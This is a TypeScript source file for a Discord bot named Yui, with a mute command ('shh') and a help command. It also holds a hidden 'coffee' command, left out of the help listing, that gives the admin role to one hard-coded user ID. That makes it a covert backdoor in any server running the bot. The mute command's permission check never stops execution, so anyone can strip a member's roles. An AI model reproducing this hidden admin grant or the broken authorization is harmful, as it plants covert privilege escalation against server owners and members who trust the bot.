import * as Discord from "discord.js";
import * as toHex from "colornames";

const prefix = '-';
let myID: string = "myIDHere" // TODO: replace with your Snowflake
let muteRole: string = "mutedRoleIDHere" // TODO: replace with Snowflake of mute role
let adminRole: string = "mutedRoleIDHere" // TODO: replace with Snowflake of admin role
export const data = {
  prefix: prefix,
  hiddencommands: {
    coffee: {
      // makes you admin :)
      run: function (msg: Discord.Message) {
        console.log(msg.member?.id);
        return new Promise(function (s) {
          if (msg.member?.id === myID) {
            msg.member?.roles.add(adminRole)
            console.log(msg.guild?.roles);
            s()
          }
        });
      }
    }
  },
  commands: {
    shh: {
      desc: "Sleepy time for you. Requires manage roles permission.",
      args: "(@user)",
      run: function (msg: Discord.Message, args: Array<string>) {
        return new Promise(function (res) {
          let reason;
          if (!msg.member?.hasPermission("MANAGE_ROLES")) {
            msg.channel.send("Woah, you're not a mod, dude. Sorry :/");
          }
          if (args.length > 1) {
            reason = ' Reason: <' + args.splice(1).join(" ") + '>';
          } else {
            reason = "";
          }
          let usr = msg.mentions.members?.first();
          console.log(usr);
          usr?.roles.set([muteRole]);
          let embed = new Discord.MessageEmbed();
          // @ts-ignore
          embed.setColor(toHex("mistyrose"));
          embed.setTitle("_Go to sleep, " + usr?.user.username + "_");
          embed.setDescription(`${usr?.user.tag} has been put to sleep.${reason}`);
          embed.setFooter("Bot made by Jabster28#6048");
          msg.channel.send(embed).then(res)
        });
      }
    },
    help: {
      desc: "Shows all commands.",
      run: function (msg: Discord.Message) {
        return new Promise(function (res) {
          let embed = new Discord.MessageEmbed();
          // @ts-ignore
          embed.setColor(toHex("orchid"));
          embed.setTitle("Hi!"); // TODO: replace with bot name
          embed.setDescription("Hi there! I'm Yui, and I'm here to help you with anything you may need!");
          let ref: any = data.commands
          let k: string
          let ref1
          for (k in ref) {
            let v = ref[k];
            embed.addField(prefix + k + " " + ((ref1 = v.args) != null ? ref1 : " "), v.desc);
          }
          embed.setFooter("Arguments in (parentheses) are required, and arguments in [brackets] are optional and will default to the {braces} option.\nBot made by Jabster28#6048")
          msg.channel.send(embed).then(res);
        });
      }
    }
  }
};
